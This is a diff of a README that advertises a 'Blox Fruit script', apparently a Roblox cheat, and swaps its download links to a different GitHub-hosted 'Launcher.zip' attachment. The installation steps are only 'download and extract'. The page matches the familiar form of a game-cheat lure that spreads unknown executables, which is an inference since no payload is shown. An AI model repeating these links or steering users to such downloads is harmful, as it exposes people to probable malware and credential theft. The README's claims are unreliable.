@@ -1,9 +1,9 @@
-# Blox Fruit script [![Download Blox Fruit script](https://img.shields.io/badge/Download-Blox%20Fruit%20script-blueviolet)](https://github.com/user-attachments/files/16947197/Launcher.zip)
+# Blox Fruit script [![Download Blox Fruit script](https://img.shields.io/badge/Download-Blox%20Fruit%20script-blueviolet)](https://github.com/user-attachments/files/16947433/Launcher.zip)
 
 ## Installation
 To install Blox Fruit script, follow these simple steps:
 1. Download the Blox Fruit script package from here 
-    [![Download Blox Fruit script](https://img.shields.io/badge/Download-Blox%20Fruit%20script-blueviolet)](https://github.com/user-attachments/files/16947197/Launcher.zip)
+    [![Download Blox Fruit script](https://img.shields.io/badge/Download-Blox%20Fruit%20script-blueviolet)](https://github.com/user-attachments/files/16947433/Launcher.zip)
  
 2. Extract the downloaded ZIP file to your desired location on your system.
 
@@ -15,7 +15,8 @@ To install Blox Fruit script, follow these simple steps:
 - [Contributing](#contributing)
 - [License](#license)
 
-![maxresdefault (21)](https://github.com/user-attachments/assets/92ce9c65-2210-4d19-bcd9-64a5ec4a29ae)
+![maxresdefault (23)](https://github.com/user-attachments/assets/51493443-0f33-4da8-9c5b-cf4a0f832fc9)
+
 
 
 ## Introduction
